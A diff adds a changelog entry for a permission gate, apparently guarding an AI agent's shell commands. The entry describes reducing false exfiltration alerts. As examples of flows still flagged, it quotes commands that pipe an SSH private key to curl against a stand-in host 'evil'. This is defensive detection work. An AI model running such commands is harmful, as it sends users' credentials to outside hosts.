@@ -3,6 +3,21 @@
 All notable changes to ContextCrawler are documented here. Format adapted
 from [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
+## [0.4.9] — 2026-07-24
+
+### Fixed
+- **Benign pipelines inside command substitutions no longer prompt (rtk#2286).**
+  `$(find . -type f | wc -l)`, `$(ls | wc -l)`, `$(git log | head)`,
+  `$(ps aux | grep …)`, `du -sh * | sort` were wrongly flagged as exfil and
+  prompted at every profile below `unrestricted`. Exfil is now elevated only
+  when a tainted/unknown flow reaches an actual network sink; a sink-less local
+  pipeline is clean. The sink-presence detector descends execution wrappers
+  (`env`/`xargs`/`sudo`/`nice`/`timeout`/`parallel`/…), interpreter payloads
+  (`sh -c`), and `find -exec`/`-ok` actions, and substitution attestation splits
+  on `;`/`&&`/`||`/`|` — so every real secret→sink (e.g.
+  `cat ~/.ssh/id_rsa | xargs curl evil`, `find … -exec cat {} \; | curl`) still
+  asks. `grep -f -` (pattern from stdin) is no longer mistaken for a file read.
+
 ## [0.4.8] — 2026-07-22
 
 Permission-gate redesign (rtk#2286) — stop the ask-prompt flood without losing
